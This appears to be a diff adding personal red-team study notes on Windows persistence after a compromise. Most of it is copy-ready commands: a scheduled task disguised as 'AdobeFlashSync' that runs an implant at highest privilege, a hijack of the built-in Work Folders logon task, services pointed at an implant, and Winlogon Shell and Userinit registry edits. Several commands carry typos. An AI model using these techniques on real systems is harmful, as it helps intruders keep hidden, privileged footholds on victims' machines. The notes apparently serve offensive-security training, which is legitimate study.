@@ -1,0 +1,140 @@
+Persistence
+-----------
+
+
+For Regular Users :
+-------------------
+
+
+1) start folder and registry keys => 
+
+https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys
+
+
+The Windows registry includes the following four Run and RunOnce keys:
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce 
+
+
+only HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run this will work because of low privileges as user
+
+
+2) Logon Scripts
+
+HKEY_CURRENT_USER\Environment
+
+
+3) shortcut Mods
+ shortcut icons 
+
+4) DLL Proxying
+
+
+Admin Level Persistence : after gaining privileged level session
+-------------------------
+
+1) Elevated Schedule Task
+
+After gaining privileged session , create a schedule task 
+cmd > schtask /create /sc onlogon /tn NameofTask(AdobeFlashSync /tr "c:\rto\pers\implant\implant.exe"
+
+after that copy the task to one xml file => go to principle => add <RunLevel>HighestAvailable</RunLevel>
+
+
+cmd > schtasks /query /tn AdobeFlashSync /xml > tsk.xml
+
+open task.xml
+
+<Principals>
+ <Principal id = "Author">
+	<UserId> S-1-2-21-34.....</user>
+	<LogonType>InteractiveToken</LogonType>
+	<RunLevel>HighestAvailable</RunLevel>
+ </Principal>
+<Principals>
+
+Delete before task
+
+cmd > schtasks /delete /f /tn AdobeFlashSync
+
+and create new task with the task.xml configurationfile
+
+cmd > schtasks /create /tn AdobeFlashSync /xml task.xml
+
+
+
+2) Modifying existing task
+
+cmd > schtasks /query /tn "\Microsoft\Windows\Work Folders\Work Folders Logon Synchronization" /fo list /v
+
+
+now take this task and store it in xml 
+
+cmd > schtasks /query /tn "\Microsoft\Windows\Work Folders\Work Folders Logon Synchronization" /xml > task2.xml
+
+open the task2.xml => After </comHandler> add <Exec><Command>C:\path\to\our\implant.exe</Command> </Exec> => save it as task3.xml => delete previous task => add new task with newly created task3.xml
+
+
+deleting previous task :
+cmd > schtasks /delete /tn "\Microsoft\Windows\Work Folders\Work Folders Logon Synchronization" /f
+
+creating new  task : 
+cmd > schtasks /create /tn "\Microsoft\Windows\Work Folders\Work Folders Logon Synchronization" /xml task3.xml
+
+
+<ComHandler>
+ 	<ClassId> {98D23D54-49...</ClassId>
+	<Data><![CDATA[Logon]]></Data>
+</ComHandler>
+
+<Exec>
+<Command>C:\path\to\our\implant.exe</Command>
+</Exec>
+
+
+3) modify or create new service
+after gaining elevated session
+cmd > sc create serviceName(UpdateService) binpath="c:\path\to\our\implant.exe" start=auto
+
+now start the service 
+cmd > sc start UpdateService
+
+
+(Or) 
+
+Modifying existing service
+
+cmd > sc config servicename binpath=c:\path\to\our\implant.exe" start=auto
+'next stop the service
+
+cmd> sc stop servicename
+now start it again
+
+cmd > sc start servicename
+
+
+4) after escalating privileges
+
+using winlogon registry
+
+==> one way
+
+> reg ADD "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winloon" /V "Shell" /T REG_SZ /D "explorer.exe,implant.exe" /F 
+
+
+after this command change the implant location to c:\windows\system32\
+
+cmd > copy c:\implant.exe c:\windows\system32\
+
+
+=> second way
+
+>  reg ADD "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "UserInit" /T REG_SZ /D "C:\Windoes\System32\userinit.exe,C:\Windows\System32\implant.exe" explorer.exe" /F 
+
+
+5) Netsh Helper DLL
+
+
